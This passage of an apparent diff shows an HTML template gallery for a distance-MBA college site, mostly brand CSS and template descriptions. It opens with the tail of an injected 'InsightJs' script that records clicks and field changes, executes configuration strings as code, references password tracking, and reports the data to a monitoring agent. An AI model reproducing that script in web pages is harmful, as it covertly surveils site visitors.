obj.sub_selector).forEach(function (descendant) {                          self.send(type, page, obj, ancestors[0], elm, sub, descendant);                      });                  }                  else {                      self.send(type, page, obj, ancestors[0], elm, sub);                  }              }          });      },        /* enumerate all obj based on url and source. calls handler(page, obj) */      forEachObject: function (source, handler) {          var self = this;          this.pages.forEach(function (page) {              if (self.testRegex(page.url, document.URL)) {                  page.objects.forEach(function (obj) {                      if (obj.sources.includes(source))                          handler(page, obj);                  });              }          });      },        /* enumerate all matches based on url, source and interactionInterval, matches and selector. calls handler(page, obj, matchedElm) */      forEachMatch: function (source, ancestors, handler) {          var self = this;          this.forEachObject(source, function (page, obj) {              if (obj.interactionInterval && (self.lastInteraction == null || new Date().getTime() - self.lastInteraction > obj.interactionInterval)) {                  if (self.lastInteraction != null)                      self.log('forEachMatch skip rule: interval:' + (new Date().getTime() - self.lastInteraction).toString());              }              else {                  var scope = obj.scope === 'target' ? [ancestors[0]] : ancestors,                      m = obj.matches,                      set = !m && obj.selector ? self.applySelector(document, obj.selector) : null;                  for (var i = 0; i < scope.length; ++i) {                      if ((m && scope[i].matches && scope[i].matches(m)) /* scope[i] may not be element, test if matches is defined */                          || (set && set.includes(scope[i]))) {                          handler(page, obj, scope[i]);                          break;                      }                  }              }          });      },        /* return array of elements after applying commands from the selector settings */      applySelector: function (root, commands) {          const self = this;          var elms = [root];          commands.forEach(function (command) {              var res = [];              elms.forEach(function (elm) {                  if (command.test_text) {    /* test_text command keeps only elements whose text matches regex */                      if (self.testRegex(command.test_text, elm.textContent))                          res.push(elm);                  }                  else if (command.move) {    /* move command transforms element into querySelectorAll set and select shadowRoot if present */                      elm.querySelectorAll(':scope ' + command.move).forEach(function (e) {                          var s = e.shadowRoot;                          res.push(s ? s : e);                      });                  }                  else if (command.exists) {  /* exists command keeps only elements for which selector set is not empty */                      if (self.applySelector(elm, command.exists).length !== 0)                          res.push(elm);                  }              });              elms = res;          });          return elms;      },        /* send event data to websocket, data structure:       * {       *      cat: 'insight' - this is required to route the message to the proper handler       *      type: click | changed - type of the event       *      elm: uint32 - id of the element that fired the event. used for deduplication of the events       *      page: uint32 - id of the hypermonitored location       *      obj: uint32 - id of the hypermonitored object that fired event       *      url: string - current document url       *      token: string - js injection token, used to unique identify browser page       *      values: json - contains all collected information about event and it's context       * }       */      lastSentElm: null,      lastSentElmId: 0,      send: function (type, page, obj, target, e, sub, descendant) {          if (this.lastSentElm !== e) {              this.lastSentElm = e;              this.lastSentElmId++;          }          const values = this.calc(obj, 'values', ['target', 'e', 'sub', 'descendant'], [target, e, sub, descendant]);          if (values)              this.sendEvent(type, page, obj, this.lastSentElmId.toString(), values);      },        sendEvent: function (type, page, obj, elmId, values) {          const t = JSON.stringify({              values: values,              handler: page.handler,              type: type,              elm: elmId,              page: page.id,              obj: obj.id,              url: document.URL,              token: this.token,              proc: this.proc          });          if (this.sendLog)              console.log("[InsightJs] send: " + t);          this.processPacket(t);      },        /* utils: cache compiled regexes */      string2regex: {},      testRegex: function (stringRegex, value) {          if (stringRegex === null)              return true;          if (!(stringRegex in this.string2regex))              this.string2regex[stringRegex] = new RegExp(stringRegex);          return this.string2regex[stringRegex].test(value);      },        /* utils: cache compiled functions */      code2function: {},      calc: function (host, prop, names, args, defaultCode) {          var code = host[prop] ? "return " + host[prop] + ";" : host[prop + "_f"];          if (code == null)              code = defaultCode;          if (code == null) {              this.log("code not found, calc(" + JSON.stringify(host) + "), prop:" + prop);              return {};          }          if (!(code in this.code2function))              this.code2function[code] = new Function(...names, code);          return this.code2function[code].apply(null, args);      },        /* utils: dump html element to the log */      elementString: function (e) {          var html = e.nodeType == Node.TEXT_NODE ? e.data : e.outerHTML;          if (this.sendLogFullData)              return html;          html = html.length > 100 ? html.substr(0, 100) + " ... total len:" + html.length : html;          return html.replace(/\n|\r/g, '#');      },        /* log to console and to the agent */      log: function (message, force) {          if (this.sendLog || force) {              var m = new Date().toLocaleString() + ": " + message;              console.log("[InsightJs] " + m + ", url:" + document.URL);              this.processPacket(JSON.stringify({ handler: "log", module: "InsightJs", message: m, url: document.URL }));          }      },        callSafe: function (name, f) {          if (!this.sendLogExceptions)              f();          else {              try {                  f()              }              catch (e) {                  this.log("exception in " + name + ":" + e.name + ", " + e.message, true);              }          }      }  }},I=6e4,T=null,k=null,C=null,H=null,O=!1,P=null,F=null,J=0,R=null,B=null,_="",x=!1;!function e(t){m()?setTimeout((function(){e(t)}),1e3):t()}((function(){L.extJs&&L.extJs.init(L.token),n()&&(window.addEventListener("focus",r,!0),L.dontTrackWebPasswords&&window.addEventListener("message",E,!1)),n()||L.extJs?g():L.dontTrackWebPasswords&&D()}))}();</script>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Distance MBA College — HTML Template Gallery</title>
+<meta name="robots" content="noindex,nofollow" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Inter:wght@400;500;600&family=Lora:ital,wght@1,400;1,500&display=swap" rel="stylesheet" />
+<style>
+/* ============ TOKENS ============ */
+:root {
+  --navy:      #0B1F4D;
+  --navy-2:    #1E3A8A;
+  --navy-dark: #06143A;
+  --saffron:   #E8930E;
+  --saffron-2: #FBBF24;
+  --saffron-50:#FEF3DC;
+  --cream:     #FAF7F0;
+  --mist:      #F1F5F9;
+  --ink:       #1F2937;
+  --slate:     #475569;
+  --hairline:  #CBD5E1;
+  --white:     #FFFFFF;
+  --success:   #10B981;
+  --display: 'Poppins', system-ui, sans-serif;
+  --body:    'Inter', system-ui, sans-serif;
+  --voice:   'Lora', Georgia, serif;
+}
+
+/* ============ RESET ============ */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body { font-family: var(--body); font-size: 15px; line-height: 1.6; color: var(--ink); background: var(--mist); -webkit-font-smoothing: antialiased; }
+a { color: var(--navy); text-decoration: none; }
+ul { list-style: none; }
+::selection { background: var(--saffron); color: var(--navy); }
+
+/* ============ LAYOUT ============ */
+.wrap { max-width: 1200px; margin: 0 auto; padding: 0 clamp(20px, 4vw, 48px); }
+
+/* ============ HEADER ============ */
+.header {
+  background: var(--navy);
+  padding: 0;
+}
+.header-top {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 20px 0;
+  border-bottom: 1px solid rgba(255,255,255,0.1);
+}
+.logo {
+  display: inline-flex;
+  align-items: center;
+  gap: 12px;
+  font-family: var(--display);
+  font-size: 18px;
+  color: var(--white);
+  font-weight: 500;
+}
+.logo-icon { width: 28px; height: 26px; flex-shrink: 0; }
+.logo span.bold { color: var(--saffron); font-weight: 700; }
+.header-badge {
+  background: rgba(255,255,255,0.12);
+  color: rgba(255,255,255,0.85);
+  font-size: 11px;
+  font-weight: 600;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  padding: 6px 14px;
+  border-radius: 20px;
+  border: 1px solid rgba(255,255,255,0.2);
+}
+
+.hero-band {
+  padding: 48px 0 56px;
+}
+.hero-band h1 {
+  font-family: var(--display);
+  font-weight: 700;
+  font-size: clamp(28px, 4vw, 44px);
+  color: var(--white);
+  letter-spacing: -0.02em;
+  line-height: 1.12;
+  max-width: 18ch;
+  margin-bottom: 16px;
+}
+.hero-band h1 span {
+  font-family: var(--voice);
+  font-style: italic;
+  font-weight: 500;
+  color: var(--saffron-2);
+}
+.hero-band p {
+  font-size: 16px;
+  color: rgba(255,255,255,0.75);
+  max-width: 64ch;
+  line-height: 1.7;
+  margin-bottom: 28px;
+}
+
+/* Stats row */
+.stats-row {
+  display: flex;
+  gap: 40px;
+  flex-wrap: wrap;
+}
+.stat { }
+.stat-num {
+  font-family: var(--display);
+  font-weight: 700;
+  font-size: 26px;
+  color: var(--saffron);
+  letter-spacing: -0.02em;
+}
+.stat-label {
+  font-size: 12px;
+  color: rgba(255,255,255,0.6);
+  margin-top: 2px;
+}
+
+/* ============ QUICK NAV ============ */
+.quick-nav {
+  background: var(--white);
+  border-bottom: 1px solid var(--hairline);
+  position: sticky;
+  top: 0;
+  z-index: 40;
+}
+.quick-nav-inner {
+  display: flex;
+  gap: 0;
+  overflow-x: auto;
+  scrollbar-width: none;
+  -ms-overflow-style: none;
+}
+.quick-nav-inner::-webkit-scrollbar { display: none; }
+.quick-nav-link {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  padding: 14px 20px;
+  font-size: 13px;
+  font-weight: 500;
+  color: var(--slate);
+  border-bottom: 2px solid transparent;
+  white-space: nowrap;
+  transition: 150ms;
+}
+.quick-nav-link:hover { color: var(--navy); border-bottom-color: var(--hairline); }
+.quick-nav-link.active { color: var(--navy); border-bottom-color: var(--saffron); font-weight: 600; }
+.quick-nav-link .ql-num {
+  width: 20px; height: 20px;
+  background: var(--mist);
+  border-radius: 50%;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 10px;
+  font-weight: 700;
+  color: var(--slate);
+}
+.quick-nav-link.active .ql-num {
+  background: var(--saffron-50);
+  color: var(--navy);
+}
+
+/* ============ SECTION ============ */
+.section { padding: 64px 0; }
+.section + .section { border-top: 1px solid var(--hairline); }
+.section-label {
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  color: var(--saffron);
+  margin-bottom: 8px;
+}
+.section-title {
+  font-family: var(--display);
+  font-weight: 700;
+  font-size: clamp(22px, 3vw, 30px);
+  color: var(--navy);
+  letter-spacing: -0.02em;
+  margin-bottom: 10px;
+}
+.section-title span {
+  font-family: var(--voice);
+  font-style: italic;
+  font-weight: 500;
+  color: var(--navy-2);
+}
+.section-sub {
+  font-size: 15px;
+  color: var(--slate);
+  max-width: 64ch;
+  line-height: 1.65;
+  margin-bottom: 40px;
+}
+
+/* ============ TEMPLATE CARD ============ */
+.template-grid {
+  display: grid;
+  gap: 24px;
+}
+.template-grid-2 { grid-template-columns: repeat(2, 1fr); }
+.template-grid-3 { grid-template-columns: repeat(3, 1fr); }
+
+@media (max-width: 900px) {
+  .template-grid-2,
+  .template-grid-3 { grid-template-columns: 1fr; }
+}
+
+.template-card {
+  background: var(--white);
+  border: 1px solid var(--hairline);
+  border-radius: 16px;
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+  transition: box-shadow 200ms, transform 200ms;
+}
+.template-card:hover {
+  box-shadow: 0 12px 32px rgba(11,31,77,0.12);
+  transform: translateY(-2px);
+}
+
+/* Preview area */
+.template-preview {
+  position: relative;
+  background: var(--mist);
+  height: 220px;
+  overflow: hidden;
+  border-bottom: 1px solid var(--hairline);
+}
+.template-preview iframe {
+  width: 1400px;
+  height: 900px;
+  border: none;
+  transform-origin: top left;
+  transform: scale(0.285);
+  pointer-events: none;
+}
+.template-preview-overlay {
+  position: absolute;
+  inset: 0;
+  cursor: pointer;
+  display: flex;
+  align-items: flex-end;
+  padding: 16px;
+  background: linear-gradient(to top, rgba(11,31,77,0.5) 0%, transparent 60%);
+  opacity: 0;
+  transition: opacity 200ms;
+}
+.template-card:hover .template-preview-overlay { opacity: 1; }
+.preview-open-btn {
+  background: var(--white);
+  color: var(--navy);
+  font-weight: 600;
+  font-size: 13px;
+  padding: 8px 16px;
+  border-radius: 8px;
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+}
+
+/* Card body */
+.template-body {
+  padding: 24px;
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+}
+.template-meta {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 12px;
+}
+.template-type {
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--saffron);
+  background: var(--saffron-50);
+  padding: 4px 10px;
+  border-radius: 4px;
+}
+.template-num {
+  font-family: var(--display);
+  font-weight: 700;
+  font-size: 13px;
+  color: var(--slate);
+}
+.template-name {
+  font-family: var(--display);
+  font-weight: 700;
+  font-size: 18px;
+  color: var(--navy);
+  margin-bottom: 6px;
+  letter-spacing: -0.01em;
+}
+.template-desc {
+  font-size: 14px;
+  color: var(--slate);
+  line-height: 1.6;
+  margin-bottom: 20px;
+}
+.template-tags {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 6px;
+  margin-bottom: 20px;
+}
+.tag {
+  font-size: 11px;
+  font-weight: 600;
+  color: var(--navy-2);
+  background: var(--mist);
+  border: 1px solid var(--hairline);
+  padding: 4px 10px;
+  border-radius: 4px;
+  letter-spacing: 0.04em;
+}
+.tag.green { color: var(--success); background: rgba(16,185,129,0.08); border-color: rgba(16,185,129,0.2); }
+.tag.saffron { color: #9a5e05; background: var(--saffron-50); border-color: rgba(232,147,14,0.3); }
+.template-actions {
+  margin-top: auto;
+  display: flex;
+  gap: 10px;
+}
+.btn-open {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  background: var(--saffron);
+  color: var(--navy);
+  font-weight: 700;
+  font-size: 13px;
+  padding: 10px 18px;
+  border-radius: 8px;
+  transition: background 150ms;
+  cursor: pointer;
+}
+.btn-open:hover { background: #d8830a; color: var(--navy); }
+.btn-outline {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  background: transparent;
+  color: var(--navy);
+  border: 1.5px solid var(--navy);
+  font-weight: 600;
+  font-size: 13px;
+  padding: 10px 16px;
+  border-radius: 8px;
+  transition: all 150ms;
+  cursor: pointer;
+}
+.btn-outline:hover { background: var(--navy); color: var(--white); }
+
+/* Template features list */
+.template-features {
+  margin-top: 20px;
+  padding-top: 20px;
+  border-top: 1px solid var(--hairline);
+}
+.template-features-title {
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--slate);
+  margin-bottom: 10px;
+}
+.feature-list { display: grid; gap: 6px; }
+.feature-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 8px;
+  font-size: 13px;
+  color: var(--ink);
+}
+.feature-item::before {
+  content: "✓";
+  color: var(--success);
+  font-weight: 700;
+  font-size: 12px;
+  flex-shrink: 0;
+  margin-top: 1px;
+}
+
+/* ============ FULL-WIDTH TEMPLATE CARD (for homepage) ============ */
+.template-card-full {
+  background: var(--white);
+  border: 1px solid var(--hairline);
+  border-radius: 16px;
+  overflow: hidden;
+  display: grid;
+  grid-template-columns: 1.6fr 1fr;
+  transition: box-shadow 200ms;
+}
+.template-card-full:hover { box-shadow: 0 12px 32px rgba(11,31,77,0.12); }
+.template-preview-full {
+  background: var(--mist);
+  height: 320px;
+  overflow: hidden;
+  border-right: 1px solid var(--hairline);
+  position: relative;
+}
+.template-preview-full iframe {
+  width: 1400px;
+  height: 1100px;
+  border: none;
+  transform-origin: top left;
+  transform: scale(0.31);
+  pointer-events: none;
+}
+.template-preview-full .template-preview-overlay {
+  position: absolute; inset: 0;
+  cursor: pointer;
+  display: flex; align-items: flex-end; padding: 20px;
+  background: linear-gradient(to top, rgba(11,31,77,0.5) 0%, transparent 60%);
+  opacity: 0; transition: opacity 200ms;
+}
+.template-card-full:hover .template-preview-overlay { opacity: 1; }
+.template-body-full {
+  padding: 32px;
+  display: flex;
+  flex-direction: column;
+}
+@media (max-width: 900px) {
+  .template-card-full { grid-template-columns: 1fr; }
+  .template-preview-full { border-right: none; border-bottom: 1px solid var(--hairline); }
+}
+
+/* ============ COMPONENT REFERENCE ============ */
+.comp-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 16px;
+}
+@media (max-width: 900px) { .comp-grid { grid-template-columns: 1fr; } }
+
+.comp-card {
+  background: var(--white);
+  border: 1px solid var(--hairline);
+  border-radius: 12px;
+  padding: 20px;
+}
+.comp-card-icon {
+  width: 40px; height: 40px;
+  border-radius: 10px;
+  background: var(--saffron-50);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 18px;
+  margin-bottom: 14px;
+}
+.comp-card-name {
+  font-family: var(--display);
+  font-weight: 700;
+  color: var(--navy);
+  font-size: 15px;
+  margin-bottom: 6px;
+}
+.comp-card-desc {
+  font-size: 13px;
+  color: var(--slate);
+  line-height: 1.55;
+  margin-bottom: 12px;
+}
+.comp-card-used {
+  font-size: 11px;
+  font-weight: 600;
+  color: var(--slate);
+  letter-spacing: 0.06em;
+  text-transform: uppercase;
+}
+.comp-card-used span {
+  color: var(--navy-2);
+  font-weight: 500;
+  text-transform: none;
+  letter-spacing: 0;
+}
+
+/* ============ DESIGN TOKENS REFERENCE ============ */
+.tokens-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 24px;
+}
+@media (max-width: 700px) { .tokens-grid { grid-template-columns: 1fr; } }
+
+.token-block {
+  background: var(--white);
+  border: 1px solid var(--hairline);
+  border-radius: 12px;
+  padding: 24px;
+}
+.token-block h4 {
+  font-family: var(--display);
+  font-weight: 700;
+  font-size: 14px;
+  color: var(--navy);
+  margin-bottom: 16px;
+  letter-spacing: -0.01em;
+}
+.color-swatch-row { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 12px; }
+.color-swatch {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  width: 100%;
+  margin-bottom: 8px;
+}
+.swatch-box { width: 36px; height: 36px; border-radius: 8px; border: 1px solid rgba(0,0,0,0.08); flex-shrink: 0; }
+.swatch-info { }
+.swatch-name { font-weight: 600; font-size: 13px; color: var(--navy); }
+.swatch-hex { font-family: 'SF Mono', Menlo, monospace; font-size: 11px; color: var(--slate); }
+.font-sample { padding: 10px 0; border-bottom: 1px solid var(--hairline); }
+.font-sample:last-child { border-bottom: none; }
+.font-sample-text { font-size: 18px; color: var(--ink); }
+.font-sample-meta { font-size: 11px; color: var(--slate); margin-top: 4px; font-family: 'SF Mono', Menlo, monospace; }
+
+/* ============ FILE STRUCTURE ============ */
+.file-tree {
+  background: var(--navy-dark);
+  border-radius: 12px;
+  padding: 24px 28px;
+  font-family: 'SF Mono', Menlo, 'Courier New', monospace;
+  font-size: 13px;
+  line-height: 2;
+  color: rgba(255,255,255,0.85);
+  overflow-x: auto;
+}
+.ft-folder { color: var(--saffron-2); font-weight: 600; }
+.ft-file { color: rgba(255,255,255,0.75); }
+.ft-file-active { color: var(--success); font-weight: 600; }
+.ft-comment { color: rgba(255,255,255,0.35); font-style: italic; }
+
+/* ============ DEVELOPER NOTES ============ */
+.note-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+@media (max-width: 700px) { .note-grid { grid-template-columns: 1fr; } }
+.note-card {
+  background: var(--white);
+  border: 1px solid var(--hairline);
+  border-radius: 12px;
+  padding: 20px 24px;
+}
+.note-icon { font-size: 24px; margin-bottom: 10px; }
+.note-title { font-family: var(--display); font-weight: 700; font-size: 15px; color: var(--navy); margin-bottom: 8px; }
+.note-text { font-size: 13px; color: var(--slate); line-height: 1.65; }
+.note-text code { background: var(--mist); padding: 2px 6px; border-radius: 4px; font-size: 12px; font-family: 'SF Mono', Menlo, monospace; color: var(--navy); }
+
+/* ============ FOOTER ============ */
+.gallery-footer {
+  background: var(--navy-dark);
+  color: rgba(255,255,255,0.6);
+  padding: 32px 0;
+  margin-top: 80px;
+  text-align: center;
+  font-size: 13px;
+}
+.gallery-footer strong { color: var(--white); }
+.gallery-footer a { color: var(--saffron-2); }
+</style>
+</head>
+<body>
+
+<!-- ============ HEADER ============ -->
+<header class="header">
+  <div class="wrap">
+    <div class="header-top">
+      <div class="logo">
+        <svg class="logo-icon" viewBox="0 0 100 95">
+          <path d="M 12 72 L 12 40 L 50 10 L 88 40 L 88 72" fill="none" stroke="#FFFFFF" stroke-width="7" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M 5 85 Q 50 102 95 80" fill="none" stroke="#E8930E" stroke-width="6" stroke-linecap="round"/>
+        </svg>
+        <span>Distance <span class="bold">MBA</span> College</span>
+      </div>
+      <span class="header-badge">Design System v1.0 — Internal Use Only</span>
+    </div>
+
+    <div class="hero-band">
+      <h1>HTML Template <span>Gallery</span></h1>
+      <p>Seven production-ready page templates for distancembacollege.com. Every template is self-contained with brand CSS, schema markup, Aarya AI chat, mobile sticky actions, and multi-channel lead capture built in. Open any file in a browser to preview.</p>
+      <div class="stats-row">
+        <div class="stat"><div class="stat-num">7</div><div class="stat-label">Page templates</div></div>
+        <div class="stat"><div class="stat-num">1</div><div class="stat-label">Shared design system</div></div>
+        <div class="stat"><div class="stat-num">4</div><div class="stat-label">MBA modes covered</div></div>
+        <div class="stat"><div class="stat-num">25+</div><div class="stat-label">Reusable components</div></div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- ============ QUICK NAV ============ -->
+<nav class="quick-nav" aria-label="Gallery sections">
+  <div class="wrap">
+    <div class="quick-nav-inner">
+      <a href="#templates" class="quick-nav-link active"><span class="ql-num">7</span> Templates</a>
+      <a href="#components" class="quick-nav-link"><span class="ql-num">25+</span> Components</a>
+      <a href="#tokens" class="quick-nav-link"><span class="ql-num">∞</span> Design Tokens</a>
+      <a href="#files" class="quick-nav-link"><span class="ql-num">⌘</span> File Structure</a>
+      <a href="#dev" class="quick-nav-link"><span class="ql-num">⚙</span> Developer Notes</a>
+    </div>
+  </div>
+</nav>
+
+<!-- ============ TEMPLATES ============ -->
+<main>
+<section class="section" id="templates" style="background: var(--cream);">
+  <div class="wrap">
+    <div class="section-label">Template 01</div>
+    <div class="section-title">Homepage — <span>master conversion page</span></div>
+    <p class="section-sub">The single most important page on the site. Editorial hero, four-mode strip, featured universities, specialisations grid, brand promise band, counsellor moment, AI chat invitation, lead form, and FAQ. Every conversion mechanic on the site exists here in its most complete form.</p>
+
+    <!-- Full-width homepage card -->
+    <div class="template-card-full">
+      <div class="template-preview-full">
+        <a href="homepage.html" target="_blank">
+          <iframe src="homepage.html" title="Homepage template preview" loading="lazy" tabindex="-1"></iframe>
+          <div class="template-preview-overlay">
+            <span class="preview-open-btn">Open full preview ↗</span>
+          </div>
+        </a>
+      </div>
+      <div class="template-body-full">
+        <div class="template-meta">
+          <span class="template-type">Homepage</span>
+          <span class="template-num">Template 01 / 07</span>
+        </div>
+        <div class="template-name">homepage.html</div>
+        <p class="template-desc">Targets cold visitors converting within 90 seconds. The only page on the site that shows all four MBA modes, all eight featured universities, all fourteen specialisations, and all three conversion channels simultaneously.</p>
+        <div class="template-tags">
+          <span class="tag saffron">Primary conversion</span>
+          <span class="tag green">Schema: Organization + FAQPage + WebSite</span>
+          <span class="tag">4-mode strip</span>
+          <span class="tag">Aarya chat</span>
+          <span class="tag">Mobile sticky bar</span>
+          <span class="tag">FAQ accordion</span>
+        </div>
+        <div class="template-actions">
+          <a href="homepage.html" target="_blank" class="btn-open">Open template ↗</a>
+        </div>
+        <div class="template-features">
+          <div class="template-features-title">What's inside</div>
+          <ul class="feature-list">
+            <li class="feature-item">Sticky nav with Programmes and Universities dropdown menus</li>
+            <li class="feature-item">Editorial hero: Poppins + Lora italic typographic signature</li>
+            <li class="feature-item">Four-mode strip: Distance, Online, Executive, Correspondence</li>
+            <li class="feature-item">Eight university cards with NAAC badge, fee, duration, best-for</li>
+            <li class="feature-item">Fourteen specialisation cards in a 4-column grid</li>
+            <li class="feature-item">Brand promise pull-quote band on dark navy</li>
+            <li class="feature-item">Counsellor avatar + pull quote (trust signal)</li>
+            <li class="feature-item">AI chat invitation section</li>
+            <li class="feature-item">4-field lead form with FAQ below</li>
+            <li class="feature-item">Mobile: 3-action sticky bar (Call / WhatsApp / Aarya chat)</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Templates 02-04 -->
+<section class="section" id="t2-4" style="background: var(--white);">
+  <div class="wrap">
+    <div class="section-label">Templates 02 – 04</div>
+    <div class="section-title">Programme Mode, University, <span>and Comparison</span></div>
+    <p class="section-sub">The three highest-traffic page types. Programme hubs capture mode-specific search intent. University pages are the money pages where most leads convert. Comparison pages convert at the highest rate of any page type on the site.</p>
+
+    <div class="template-grid template-grid-3">
+
+      <!-- Programme mode -->
+      <div class="template-card">
+        <div class="template-preview">
+          <a href="programme-online-mba.html" target="_blank">
+            <iframe src="programme-online-mba.html" title="Programme mode template" loading="lazy" tabindex="-1"></iframe>
+            <div class="template-preview-overlay"><span class="preview-open-btn">Open ↗</span></div>
+          </a>
+        </div>
+        <div class="template-body">
+          <div class="template-meta">
+            <span class="template-type">Programme Hub</span>
+            <span class="template-num">02 / 07</span>
+          </div>
+          <div class="template-name">programme-online-mba.html</div>
+          <p class="template-desc">Mode hub capturing Distance, Online, Executive, or Correspondence MBA search intent. Definitive AEO answer at the top, cross-mode comparison table, who-it-suits grid, top universities filtered by mode.</p>
+          <div class="template-tags">
+            <span class="tag green">Schema: Course + FAQPage</span>
+            <span class="tag">AEO-first structure</span>
+            <span class="tag">Mode comparison table</span>
+            <span class="tag">Who-suits grid</span>
+          </div>
+          <div class="template-actions">
+            <a href="programme-online-mba.html" target="_blank" class="btn-open">Open ↗</a>
+          </div>
+          <div class="template-features">
+            <div class="template-features-title">Reuse for</div>
+            <ul class="feature-list">
+              <li class="feature-item">Online MBA hub page</li>
+              <li class="feature-item">Distance MBA hub page</li>
+              <li class="feature-item">Executive MBA hub page</li>
+              <li class="feature-item">Correspondence MBA hub page</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- University -->
+      <div class="template-card">
+        <div class="template-preview">
+          <a href="university-nmims.html" target="_blank">
+            <iframe src="university-nmims.html" title="University page template" loading="lazy" tabindex="-1"></iframe>
+            <div class="template-preview-overlay"><span class="preview-open-btn">Open ↗</span></div>
+          </a>
+        </div>
+        <div class="template-body">
+          <div class="template-meta">
+            <span class="template-type">University Page</span>
+            <span class="template-num">03 / 07</span>
+          </div>
+          <div class="template-name">university-nmims.html</div>
+          <p class="template-desc">The money page. Lead form embedded in the hero above the fold. Quick facts strip, honest who-it-suits and who-it-doesn't grid, programme details, fee table, accreditation deep-dive, counsellor note, compare cards.</p>
+          <div class="template-tags">
+            <span class="tag green">Schema: EducationalOrganization + Course + BreadcrumbList</span>
+            <span class="tag">Form in hero</span>
+            <span class="tag">Honest fit grid</span>
+          </div>
+          <div class="template-actions">
+            <a href="university-nmims.html" target="_blank" class="btn-open">Open ↗</a>
+          </div>
+          <div class="template-features">
+            <div class="template-features-title">Reuse for all 22+ universities</div>
+            <ul class="feature-list">
+              <li class="feature-item">Symbiosis, Amity, Manipal Jaipur</li>
+              <li class="feature-item">LPU, BITS WILP, ISB, XLRI VIL</li>
+              <li class="feature-item">IMT Ghaziabad, Welingkar, Jain</li>
+              <li class="feature-item">Any new university added to the directory</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Compare -->
+      <div class="template-card">
+        <div class="template-preview">
+          <a href="compare-nmims-vs-symbiosis.html" target="_blank">
+            <iframe src="compare-nmims-vs-symbiosis.html" title="Comparison page template" loading="lazy" tabindex="-1"></iframe>
+            <div class="template-preview-overlay"><span class="preview-open-btn">Open ↗</span></div>
+          </a>
+        </div>
+        <div class="template-body">
+          <div class="template-meta">
+            <span class="template-type">Comparison Page</span>
+            <span class="template-num">04 / 07</span>
+          </div>
+          <div class="template-name">compare-nmims-vs-symbiosis.html</div>
+          <p class="template-desc">The highest-converting page type on the site. One-line verdict banner, full side-by-side table, where-each-wins columns, choose-X-if decision cards, honest trade-off section, counsellor note, lead form.</p>
+          <div class="template-tags">
+            <span class="tag saffron">Highest converting</span>
+            <span class="tag green">Schema: FAQPage</span>
+            <span class="tag">Verdict banner</span>
+            <span class="tag">Side-by-side table</span>
+            <span class="tag">Decision cards</span>
+          </div>
+          <div class="template-actions">
+            <a href="compare-nmims-vs-symbiosis.html" target="_blank" class="btn-open">Open ↗</a>
+          </div>
+          <div class="template-features">
+            <div class="template-features-title">Reuse for all 12 comparisons</div>
+            <ul class="feature-list">
+              <li class="feature-item">University vs university (12 pages)</li>
+              <li class="feature-item">Mode vs mode (Distance vs Online, etc.)</li>
+              <li class="feature-item">India vs foreign online MBA</li>
+              <li class="feature-item">1-year vs 2-year MBA</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Templates 05-06 -->
+<section class="section" id="t5-6" style="background: var(--cream);">
+  <div class="wrap">
+    <div class="section-label">Templates 05 – 06</div>
+    <div class="section-title">Specialisation <span>and Campaign Landing Page</span></div>
+    <p class="section-sub">Specialisation pages serve career-switcher intent and route visitors to the right university. Campaign landing pages serve paid traffic from Google and Meta with a single-purpose conversion focus — no nav, no escape routes.</p>
+
+    <div class="template-grid template-grid-2">
+
+      <!-- Specialisation -->
+      <div class="template-card">
+        <div class="template-preview">
+          <a href="specialization-marketing.html" target="_blank">
+            <iframe src="specialization-marketing.html" title="Specialisation page template" loading="lazy" tabindex="-1"></iframe>
+            <div class="template-preview-overlay"><span class="preview-open-btn">Open ↗</span></div>
+          </a>
+        </div>
+        <div class="template-body">
+          <div class="template-meta">
+            <span class="template-type">Specialisation</span>
+            <span class="template-num">05 / 07</span>
+          </div>
+          <div class="template-name">specialization-marketing.html</div>
+          <p class="template-desc">Helps career switchers choose a stream then routes them to universities offering it. What you'll learn, who it suits (and who it doesn't), career paths with salary bands, top recruiters, university table, and a 4-question decision framework.</p>
+          <div class="template-tags">
+            <span class="tag">Career paths table</span>
+            <span class="tag">Salary bands 2026</span>
+            <span class="tag">University table (filtered)</span>
+            <span class="tag">Decision framework</span>
+          </div>
+          <div class="template-actions">
+            <a href="specialization-marketing.html" target="_blank" class="btn-open">Open ↗</a>
+          </div>
+          <div class="template-features">
+            <div class="template-features-title">Reuse for all 14 specialisations</div>
+            <ul class="feature-list">
+              <li class="feature-item">Marketing, Finance, HR, Operations</li>
